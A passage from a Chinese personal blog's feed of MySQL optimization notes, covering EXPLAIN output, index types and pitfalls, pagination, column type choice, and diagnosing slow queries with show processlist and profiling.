class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; explain select goods_id,goods_name,click_count from  goods wher</span><br><span class="line">_id=4 \G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">           id: 1</span><br><span class="line">  select_type: SIMPLE</span><br><span class="line">        table:  goods</span><br><span class="line">         <span class="built_in">type</span>: const</span><br><span class="line">possible_keys: PRIMARY</span><br><span class="line">          key: PRIMARY</span><br><span class="line">      key_len: 3</span><br><span class="line">          ref: const</span><br><span class="line">         rows: 1</span><br><span class="line">        Extra:</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; explain select max(goods_id) from  goods \G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">           id: 1</span><br><span class="line">  select_type: SIMPLE</span><br><span class="line">        table: NULL</span><br><span class="line">         <span class="built_in">type</span>: NULL myisam表的max,min,count在表中优化过,不需要\真正查找,为NULL</span><br><span class="line">possible_keys: NULL</span><br><span class="line">          key: NULL</span><br><span class="line">      key_len: NULL</span><br><span class="line">          ref: NULL</span><br><span class="line">         rows: NULL</span><br><span class="line">        Extra: Select tables optimized away</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure></p><h3 id="ref列"><a href="#ref列" class="headerlink" title="ref列"></a>ref列</h3><p>指连接查询时, 表之间的字段引用关系.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; explain select goods_id,cat_name,goods_name from  goods inner join ec</span><br><span class="line">_category using(cat_id) <span class="built_in">where</span> ecs_category.cat_name=<span class="string">''</span> \G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">           id: 1</span><br><span class="line">  select_type: SIMPLE</span><br><span class="line">        table:  goods</span><br><span class="line">         <span class="built_in">type</span>: ALL</span><br><span class="line">possible_keys: cat_id</span><br><span class="line">          key: NULL</span><br><span class="line">      key_len: NULL</span><br><span class="line">          ref: NULL</span><br><span class="line">         rows: 31</span><br><span class="line">        Extra:</span><br><span class="line">*************************** 2. row ***************************</span><br><span class="line">           id: 1</span><br><span class="line">  select_type: SIMPLE</span><br><span class="line">        table: ecs_category</span><br><span class="line">         <span class="built_in">type</span>: eq_ref</span><br><span class="line">possible_keys: PRIMARY</span><br><span class="line">          key: PRIMARY</span><br><span class="line">      key_len: 2</span><br><span class="line">          ref: shop. goods.cat_id</span><br><span class="line">         rows: 1</span><br><span class="line">        Extra: Using <span class="built_in">where</span></span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="rows"><a href="#rows" class="headerlink" title="rows :"></a>rows :</h2><p>是指估计要扫描多少行.</p><h2 id="extra"><a href="#extra" class="headerlink" title="extra:"></a>extra:</h2><ul><li>index: 是指用到了索引覆盖,效率非常高</li><li>using where 是指光靠索引定位不了,还得where判断一下 </li><li>using temporary 是指用上了临时表, group by 与order by 不同列时,或group by ,order by 别的表的列.</li><li>using filesort : 文件排序(文件可能在磁盘,也可能在内存), </li></ul>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mysql优化之索引学习脑图</title>
      <link href="/2018/09/26/mysql%E4%BC%98%E5%8C%96%E4%B9%8B%E7%B4%A2%E5%BC%95%E5%AD%A6%E4%B9%A0%E8%84%91%E5%9B%BE/"/>
      <url>/2018/09/26/mysql%E4%BC%98%E5%8C%96%E4%B9%8B%E7%B4%A2%E5%BC%95%E5%AD%A6%E4%B9%A0%E8%84%91%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<p>总结了索引学习的脑图，方便回忆以及系统的学习对照<br><a id="more"></a></p><p><img src="索引学习脑图.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mysql优化之重复索引，冗余索引以及索引碎片</title>
      <link href="/2018/09/26/mysql%E4%BC%98%E5%8C%96%E4%B9%8B%E9%87%8D%E5%A4%8D%E7%B4%A2%E5%BC%95%EF%BC%8C%E5%86%97%E4%BD%99%E7%B4%A2%E5%BC%95%E4%BB%A5%E5%8F%8A%E7%B4%A2%E5%BC%95%E7%A2%8E%E7%89%87/"/>
      <url>/2018/09/26/mysql%E4%BC%98%E5%8C%96%E4%B9%8B%E9%87%8D%E5%A4%8D%E7%B4%A2%E5%BC%95%EF%BC%8C%E5%86%97%E4%BD%99%E7%B4%A2%E5%BC%95%E4%BB%A5%E5%8F%8A%E7%B4%A2%E5%BC%95%E7%A2%8E%E7%89%87/</url>
      
        <content type="html"><![CDATA[<p>重复索引，冗余索引以及索引碎片,了解一下<br><a id="more"></a></p><h1 id="重复索引"><a href="#重复索引" class="headerlink" title="重复索引"></a>重复索引</h1><p>重复索引: 是指 在同1个列(如age), 或者 顺序相同的几个列(age,school), 建立了多个索引,<br>称为重复索引, 重复索引没有任何帮助,只会增大索引文件,拖慢更新速度, 去掉.</p><h1 id="冗余索引"><a href="#冗余索引" class="headerlink" title="冗余索引"></a>冗余索引</h1><p>冗余索引是指2个索引所覆盖的列有重叠, 称为冗余索引<br>比如 x,m,列   , 加索引  index x(x),  index xm(x,m)<br>x,xm索引, 两者的x列重叠了,  这种情况,称为冗余索引.</p><p>甚至可以把 index mx(m,x) 索引也建立, mx, xm 也不是重复的,因为列的顺序不一样.</p><h1 id="索引碎片"><a href="#索引碎片" class="headerlink" title="索引碎片"></a>索引碎片</h1><p>在长期的数据更改过程中, 索引文件和数据文件,都将产生空洞,形成碎片.<br>我们可以通过一个nop操作(不产生对数据实质影响的操作), 来修改表.<br>比如: 表的引擎为innodb , 可以 alter table xxx engine innodb</p><p>optimize table 表名 ,也可以修复.</p><p>注意: 修复表的数据及索引碎片,就会把所有的数据文件重新整理一遍,使之对齐.<br>这个过程,如果表的行数比较大,也是非常耗费资源的操作.<br>所以,不能频繁的修复.</p><p>如果表的Update操作很频率,可以按周/月,来修复.<br>如果不频繁,可以更长的周期来做修复.</p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mysql优化之大数据量分页优化</title>
      <link href="/2018/09/26/mysql%E4%BC%98%E5%8C%96%E4%B9%8B%E5%A4%A7%E6%95%B0%E6%8D%AE%E9%87%8F%E5%88%86%E9%A1%B5%E4%BC%98%E5%8C%96/"/>
      <url>/2018/09/26/mysql%E4%BC%98%E5%8C%96%E4%B9%8B%E5%A4%A7%E6%95%B0%E6%8D%AE%E9%87%8F%E5%88%86%E9%A1%B5%E4%BC%98%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>limit 及翻页优化</p><a id="more"></a><h1 id="分页以及分页性能问题"><a href="#分页以及分页性能问题" class="headerlink" title="分页以及分页性能问题"></a>分页以及分页性能问题</h1><p>使用sql实现分页是一件非常简单的事情，如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test_shop <span class="built_in">limit</span> offset,N</span><br></pre></td></tr></table></figure><p>但是，当偏移量offset非常大时，效率极低，原因如下:<br>mysql并不是跳过offset行,然后单取N行,而是取offset+N行,返回放弃前offset行,返回N行.效率较低,当offset越大时,效率越低</p><h1 id="分页优化"><a href="#分页优化" class="headerlink" title="分页优化"></a>分页优化</h1><h2 id="业务上解决"><a href="#业务上解决" class="headerlink" title="业务上解决"></a>业务上解决</h2><p>  最简单的方法，限制页的最大值</p><h2 id="不用offset，用条件来查询"><a href="#不用offset，用条件来查询" class="headerlink" title="不用offset，用条件来查询"></a>不用offset，用条件来查询</h2><p>  如下所示:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,name from lx_com <span class="built_in">limit</span> 5000000,10;</span><br></pre></td></tr></table></figure><p>  可按照条件查询</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,name from lx_com <span class="built_in">where</span> id&gt;5000000 <span class="built_in">limit</span> 10</span><br></pre></td></tr></table></figure><p>按条件来查询的话可能会出现下列问题：<br>2次的结果不一致<br>原因: 数据被物理删除过,有空洞.<br>解决: 数据不进行物理删除(可以逻辑删除).</p><p>最终在页面上显示数据时,逻辑删除的条目不显示即可.<br>(一般来说,大网站的数据都是不物理删除的,只做逻辑删除 ,比如 is_delete=1)</p><h2 id="索引延迟"><a href="#索引延迟" class="headerlink" title="索引延迟"></a>索引延迟</h2><p>  如高性能mysql中提到的解决方法<br>  <img src="索引延迟.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mysql优化之索引长度</title>
      <link href="/2018/09/26/mysql%E4%BC%98%E5%8C%96%E4%B9%8B%E7%B4%A2%E5%BC%95%E9%95%BF%E5%BA%A6/"/>
      <url>/2018/09/26/mysql%E4%BC%98%E5%8C%96%E4%B9%8B%E7%B4%A2%E5%BC%95%E9%95%BF%E5%BA%A6/</url>
      
        <content type="html"><![CDATA[<p>索引长度直接影响索引文件的大小,影响增删改的速度,并间接影响查询速度(占用内存多)。<br>索引很长的字符列，会让索引变得大且慢。一个策略是模拟的哈希索引，另一个策略是前缀索引。<br><a id="more"></a></p><h1 id="前缀索引"><a href="#前缀索引" class="headerlink" title="前缀索引"></a>前缀索引</h1><p>针对列中的值,从左往右截取部分,来建索引<br>1: 截的越短, 重复度越高,区分度越小, 索引效果越不好<br>2: 截的越长, 重复度越低,区分度越高, 索引效果越好,但带来的影响也越大–增删改变慢,并间影响查询速度.</p><p>所以, 我们要在  区分度 + 长度  两者上,取得一个平衡.</p><p>惯用手法: 截取不同长度,并测试其区分度,</p><p>此处的区分度在高性能mysql上指的是索引选择性： 指不重复的索引值(也成基数，cardinality)和数据表的记录总数(#T)的比值<br>选择性越高则查询效率越高，唯一索引的选择性是1，性能是最好的。可点<a href="https://blog.xhzyxed.cn/2018/07/03/%E9%AB%98%E6%80%A7%E8%83%BDmysql%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%88%9B%E5%BB%BA%E9%AB%98%E6%80%A7%E8%83%BD%E7%9A%84%E7%B4%A2%E5%BC%95/#%E5%89%8D%E7%BC%80%E7%B4%A2%E5%BC%95%E5%92%8C%E7%B4%A2%E5%BC%95%E9%80%89%E6%8B%A9%E6%80%A7">这里</a>查看</p><p>例如：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(distinct left(word,6))/count(*) from dict;</span><br></pre></td></tr></table></figure></p><p>索引也是按照选择性最高也就是比值最大的的索引长度来设置例如：index(left(word,4))</p><h1 id="哈希索引"><a href="#哈希索引" class="headerlink" title="哈希索引"></a>哈希索引</h1><p>2:对于左前缀不易区分的列 ,建立索引的技巧<br>如 url列</p><p><a href="http://www.baidu.com" target="_blank" rel="noopener">http://www.baidu.com</a><br><a href="http://www.zixue.it" target="_blank" rel="noopener">http://www.zixue.it</a></p><p>列的前11个字符都是一样的,不易区分, 可以用如下2个办法来解决</p><ul><li>1: 把列内容倒过来存储,并建立索引 </li></ul><p>Moc.udiab.www//:ptth<br>Ti.euxiz.www//://ptth<br>这样左前缀区分度大,</p><ul><li>2: 伪hash索引效果</li></ul><p>可以使用crc32对url进行hash之后存进新的列，查询的时候，同样进行crc32加密进行查询，可大大的提高查询效率，在索引长度很大的时候。</p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mysql优化之聚簇索引</title>
      <link href="/2018/09/26/mysql%E4%BC%98%E5%8C%96%E4%B9%8B%E8%81%9A%E7%B0%87%E7%B4%A2%E5%BC%95/"/>
      <url>/2018/09/26/mysql%E4%BC%98%E5%8C%96%E4%B9%8B%E8%81%9A%E7%B0%87%E7%B4%A2%E5%BC%95/</url>
      
        <content type="html"><![CDATA[<p>聚簇索引(主要关注InnoDB)不是一种单独的索引类型，而是一种数据存储的方式。具体的细节依赖于其实现方式，但InnoDB的聚簇索引实际上在同一个结构中保存了B-Tree索引和数据行。</p><a id="more"></a><p>索引的全部知识可参考我的<a href="https://blog.xhzyxed.cn/2018/07/03/%E9%AB%98%E6%80%A7%E8%83%BDmysql%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%88%9B%E5%BB%BA%E9%AB%98%E6%80%A7%E8%83%BD%E7%9A%84%E7%B4%A2%E5%BC%95/">高性能mysql学习笔记-创建高性能的索引</a></p><h1 id="聚簇索引与非聚簇索引"><a href="#聚簇索引与非聚簇索引" class="headerlink" title="聚簇索引与非聚簇索引"></a>聚簇索引与非聚簇索引</h1><p>都属于B-Tree索引类型，只不过数据存储的方式不同，Myisam与innodb引擎,索引文件的异同，如下两图所示：</p><p><img src="非聚簇索引.png" alt=""></p><p><img src="聚簇索引.png" alt=""></p><p>由上图可知：</p><p>innodb的主索引文件上 直接存放该行数据,称为聚簇索引,次索引指向对主键的引用<br>myisam中, 主索引和次索引,都指向物理行(磁盘位置).</p><p>注意: innodb来说：</p><ul><li>1: 主键索引 既存储索引值,又在叶子中存储行的数据</li><li>2: 如果没有主键, 则会Unique key做主键 </li><li>3: 如果没有unique,则系统生成一个内部的rowid做主键.</li><li>4: 像innodb中,主键的索引结构中,既存储了主键值,又存储了行数据,这种结构称为”聚簇索引”</li></ul><h1 id="聚簇索引的优缺点"><a href="#聚簇索引的优缺点" class="headerlink" title="聚簇索引的优缺点"></a>聚簇索引的优缺点</h1><p>优势: 根据主键查询条目比较少时,不用回行(数据就在主键节点下)<br>劣势: 如果碰到不规则数据插入时,造成频繁的页分裂.</p><p>页分裂过程如下所示：</p><p><img src="页分裂.png" alt=""></p><h1 id="聚簇索引高性能索引策略"><a href="#聚簇索引高性能索引策略" class="headerlink" title="聚簇索引高性能索引策略"></a>聚簇索引高性能索引策略</h1><ul><li><p>聚簇索引的主键值,应尽量是连续增长的值,而不是要是随机值, (不要用随机字符串或UUID)否则会造成大量的页分裂与页移动<br>对于innodb而言,因为节点下有数据文件,因此节点的分裂将会比较慢.对于innodb的主键,尽量用整型,而且是递增的整型.如果是无规律的数据,将会产生的页的分裂,影响速度.</p></li><li><p>采用索引覆盖:索引覆盖是指 如果查询的列恰好是索引的一部分,那么查询只需要在索引文件上进行,不需要回行到磁盘再找数据.</p><p>  例如：</p><pre><code>index(id,name)select name from test_shop_user where id=&apos;101&apos; and name=&apos;seven&apos; </code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mysql优化之btree索引</title>
      <link href="/2018/09/24/mysql%E4%BC%98%E5%8C%96%E4%B9%8Bbtree%E7%B4%A2%E5%BC%95/"/>
      <url>/2018/09/24/mysql%E4%BC%98%E5%8C%96%E4%B9%8Bbtree%E7%B4%A2%E5%BC%95/</url>
      
        <content type="html"><![CDATA[<p>btree索引与哈希索引的特点，btree最左侧原则以及btree索引与order by和group by的优化<br><a id="more"></a></p><h1 id="与哈希索引对比"><a href="#与哈希索引对比" class="headerlink" title="与哈希索引对比"></a>与哈希索引对比</h1><ul><li>1:索引类型<br>1.1 B-tree索引<br>注: 名叫btree索引,大的方面看,都用的平衡树,但具体的实现上, 各引擎稍有不同,<br>比如,严格的说,NDB引擎,使用的是T-tree<br>Myisam,innodb中,默认用B-tree索引</li></ul><p>但抽象一下—B-tree系统,可理解为”排好序的快速查找结构”.  </p><ul><li><p>1.2 hash索引<br>   在memory表里,默认是hash索引, hash的理论查询时间复杂度为O(1)</p></li><li><p>疑问: 既然hash的查找如此高效,为什么不都用hash索引?<br>答:<br>1:hash函数计算后的结果,是随机的,如果是在磁盘上放置数据,<br>比主键为id为例, 那么随着id的增长, id对应的行,在磁盘上随机放置.<br>2: 无法对范围查询进行优化.<br>3: 无法利用前缀索引. 比如 在btree中, field列的值“hellopworld”,并加索引<br>查询 xx=helloword,自然可以利用索引, xx=hello,也可以利用索引. (左前缀索引)<br>因为hash(‘helloword’),和hash(‘hello’),两者的关系仍为随机<br>4: 排序也无法优化.<br>5: 必须回行.就是说 通过索引拿到数据位置,必须回到表中取数据</p></li></ul><h1 id="左前缀索引"><a href="#左前缀索引" class="headerlink" title="左前缀索引"></a>左前缀索引</h1><ul><li><p>1: btree索引的常见误区<br>1.1 在where条件常用的列上都加上索引<br>例: where cat_id=3 and price&gt;100 ; //查询第3个栏目,100元以上的商品<br>误: cat_id上,和, price上都加上索引.<br>错: 只能用上cat_id或Price索引,因为是独立的索引,同时只能用上1个.</p></li><li><p>2.2 在多列上建立索引后,查询哪个列,索引都将发挥作用<br>误: 多列索引上,索引发挥作用,需要满足左前缀要求.</p></li></ul><p>以 index(a,b,c) 为例,<br>语句    索引是否发挥作用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Where a=3是,只使用了a列</span><br><span class="line">Where a=3 and b=5 是,使用了a,b列</span><br><span class="line">Where a=3 and b=5 and c=4是,使用了abc</span><br><span class="line">Where b=3  /  <span class="built_in">where</span> c=4否</span><br><span class="line">Where a=3 and c=4a列能发挥索引,c不能</span><br><span class="line">Where a=3 and b&gt;10 and c=7A能利用,b能利用, C不能利用</span><br><span class="line">同上,<span class="built_in">where</span> a=3 and b like ‘xxxx%’ and c=7A能用,B能用,C不能用</span><br></pre></td></tr></table></figure></p><p>最简单理解就是，多列索引必须从左往右生效，其中有一个断掉，后续的索引都不生效</p><h1 id="order-by与索引"><a href="#order-by与索引" class="headerlink" title="order by与索引"></a>order by与索引</h1><p>order by可以使用索引，使用组合索引的时候注意order by字段的顺序，若，order by中有一个字段已在where中指定了，则顺序不影响使用索引</p><p>排序可能发生2种情况:<br>1: 对于覆盖索引,直接在索引上查询时,就是有顺序的, using index<br>2: 先取出数据,形成临时表做filesort(文件排序,但文件可能在磁盘上,也可能在内存中)</p><p>我们的争取目标—–取出来的数据本身就是有序的! 利用索引来排序.</p><p>例如如:</p><p>goods商品表, (cat_id,shop_price)组成联合索引,<br>where cat_id=N order by shop_price ,可以利用索引来排序,<br>select goods_id,cat_id,shop_price from goods order by shop_price;<br>// using where,按照shop_price索引取出的结果,本身就是有序的.</p><p>select goods_id,cat_id,shop_price from goods order by click_count;<br>// using filesort 用到了文件排序,即取出的结果再次排序</p><h1 id="group-by与索引"><a href="#group-by与索引" class="headerlink" title="group by与索引"></a>group by与索引</h1><p>一般而言，分组需要先按照分组的字段进行排序，若字段没有键索引，则使用临时表进行排序，排序原理同上</p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mysql优化之类型的选择</title>
      <link href="/2018/09/24/mysql%E4%BC%98%E5%8C%96%E4%B9%8B%E7%B1%BB%E5%9E%8B%E7%9A%84%E9%80%89%E6%8B%A9/"/>
      <url>/2018/09/24/mysql%E4%BC%98%E5%8C%96%E4%B9%8B%E7%B1%BB%E5%9E%8B%E7%9A%84%E9%80%89%E6%8B%A9/</url>
      
        <content type="html"><![CDATA[<p>现在我们来学习具体的优化措施，学习 列类型选择</p><a id="more"></a><h1 id="列选择原则"><a href="#列选择原则" class="headerlink" title="列选择原则:"></a>列选择原则:</h1><ul><li>1:字段类型优先级 整型 &gt; date,time &gt; enum,char&gt;varchar &gt; blob</li></ul><p>列的特点分析:<br>整型: 定长,没有国家/地区之分,没有字符集的差异<br>time定长,运算快,节省空间. 考虑时区,写sql时不方便 where &gt; ‘2005-10-12’;<br>enum: 能起来约束值的目的, 内部用整型来存储,但与char联查时,内部要经历串与值的转化<br>Char 定长, 考虑字符集和(排序)校对集<br>varchar, 不定长 要考虑字符集的转换与排序时的校对集,速度慢.<br>text/Blob 无法使用内存临时表</p><p>附: 关于date/time的选择,大师的明确意见<br><a href="http://www.xaprb.com/blog/2014/01/30/timestamps-in-mysql/" target="_blank" rel="noopener">http://www.xaprb.com/blog/2014/01/30/timestamps-in-mysql/</a></p><p>性别:  以utf8为例<br>char(1) , 3个字长字节<br>enum(‘男’,’女’);  // 内部转成数字来存,多了一个转换过程<br>tinyint() ,  // 0 1 2 // 定长1个字节.</p><ul><li>2: 够用就行,不要慷慨 (如smallint,varchar(N))</li></ul><p>原因: 大的字段浪费内存,影响速度,<br>以年龄为例 tinyint unsigned not null ,可以存储255岁,足够. 用int浪费了3个字节<br>以varchar(10) ,varchar(300)存储的内容相同, 但在表联查时,varchar(300)要花更多内存</p><ul><li>3: 尽量避免用NULL()</li></ul><p>原因: NULL不利于索引,要用特殊的字节来标注.<br>在磁盘上占据的空间其实更大.</p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mysql优化之mysql进程状态</title>
      <link href="/2018/09/24/mysql%E4%BC%98%E5%8C%96%E4%B9%8Bmysql%E8%BF%9B%E7%A8%8B%E7%8A%B6%E6%80%81/"/>
      <url>/2018/09/24/mysql%E4%BC%98%E5%8C%96%E4%B9%8Bmysql%E8%BF%9B%E7%A8%8B%E7%8A%B6%E6%80%81/</url>
      
        <content type="html"><![CDATA[<p>对于某些模块仍然有卡顿或者等待时间过长的现象，我们可以采取以下方式来排查：</p><ul><li><p>show processlist或者慢查询获取有问题的sql</p></li><li><p>profilling或者explain分析语句</p><a id="more"></a></li></ul><h1 id="show-processlist"><a href="#show-processlist" class="headerlink" title="show processlist"></a>show processlist</h1><ul><li><p>分析当前有哪个连接，连接处于什么状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p123456 -e <span class="string">'show processlist'</span></span><br></pre></td></tr></table></figure></li><li><p>只取出State的值：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -padmin888 -e <span class="string">'show processlist\G'</span>|grep State</span><br></pre></td></tr></table></figure></li><li><p>去重并排序：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -padmin888 -e <span class="string">'show processlist\G'</span>|grep State|uniq|sort -rn</span><br></pre></td></tr></table></figure><p>我们如何写个脚本，每秒钟查询10次？<br>可类比我们上一篇写的每秒查询<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!bin/bash</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">mysql -uroot -padmin888 -e <span class="string">'show processlist\G'</span>|grep State|uniq|sort -rn &gt;&gt; proce.txt</span><br><span class="line">uslesp 100000</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></p><p>(usleep 100000 十分之一秒，这就每秒钟执行10次)</p><p>我们要特别注意的几种mysql进程状态:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">converting HEAP to MyISAM   <span class="comment">#查询结果太大时，把结果放在磁盘</span></span><br><span class="line">create tmp table            <span class="comment">#创建临时表（如group时存储中间结果）   </span></span><br><span class="line">Copying to tmp table        <span class="comment">#往临时表复制，很耗时间和资源</span></span><br><span class="line">Sending data                <span class="comment">#发送数据</span></span><br><span class="line">Sorting result              <span class="comment">#排序也是非常消耗资源的</span></span><br><span class="line">locked                      <span class="comment">#被其他查询锁住</span></span><br><span class="line">loggin slow query           <span class="comment">#记录慢查询</span></span><br></pre></td></tr></table></figure></p><p>若是这些进程状态引起的等待，我们可以通过设置一些mysql参数来改变这种进程状态<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like <span class="string">'%size%'</span>;</span><br><span class="line">tmp_table_size              <span class="comment">#临时表的大小</span></span><br><span class="line">myisam_sort_buffer_size     <span class="comment">#排序的大小</span></span><br><span class="line">修改：</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="built_in">set</span> global tmp_table_size=20000000</span><br></pre></td></tr></table></figure></p><h1 id="profiling"><a href="#profiling" class="headerlink" title="profiling"></a>profiling</h1><ul><li>查看是否打开？<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; show variables like <span class="string">'%profiling%'</span>;</span><br></pre></td></tr></table></figure></li></ul><ul><li>打开profiling:</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="built_in">set</span> profiling=ON;</span><br></pre></td></tr></table></figure><p>当你打开之后，你所执行的每一条sql语句，它讲帮你生成每条SQL语句的分析记录。</p><p>怎么来看呢?<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; show profiles;</span><br><span class="line">+----------+------------+-----------------------------------+</span><br><span class="line">| Query_ID | Duration   | Query                             |</span><br><span class="line">+----------+------------+-----------------------------------+</span><br><span class="line">                     |</span><br><span class="line">|        7 | 0.00040450 | select * from user                |</span><br><span class="line">+----------+------------+-----------------------------------+</span><br><span class="line">7 rows <span class="keyword">in</span> <span class="built_in">set</span>, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show profile <span class="keyword">for</span> query 7;</span><br><span class="line">+----------------------+----------+</span><br><span class="line">| Status               | Duration |</span><br><span class="line">+----------------------+----------+</span><br><span class="line">| starting             | 0.000084 |</span><br><span class="line">| checking permissions | 0.000037 |</span><br><span class="line">| Opening tables       | 0.000020 |</span><br><span class="line">| init                 | 0.000054 |</span><br><span class="line">| System lock          | 0.000023 |</span><br><span class="line">| optimizing           | 0.000004 |</span><br><span class="line">| statistics           | 0.000011 |</span><br><span class="line">| preparing            | 0.000009 |</span><br><span class="line">| executing            | 0.000002 |</span><br><span class="line">| Sending data         | 0.000076 |</span><br><span class="line">| end                  | 0.000004 |</span><br><span class="line">| query end            | 0.000009 |</span><br><span class="line">| closing tables       | 0.000008 |</span><br><span class="line">| freeing items        | 0.000041 |</span><br><span class="line">| cleaning up          | 0.000025 |</span><br><span class="line">+----------------------+----------+</span><br><span class="line">15 rows <span class="keyword">in</span> <span class="built_in">set</span>, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mysql优化之mysql status的周期变化</title>
      <link href="/2018/09/24/mysql%E4%BC%98%E5%8C%96%E4%B9%8Bmysql-status%E7%9A%84%E5%91%A8%E6%9C%9F%E5%8F%98%E5%8C%96/"/>
      <url>/2018/09/24/mysql%E4%BC%98%E5%8C%96%E4%B9%8Bmysql-status%E7%9A%84%E5%91%A8%E6%9C%9F%E5%8F%98%E5%8C%96/</url>
      
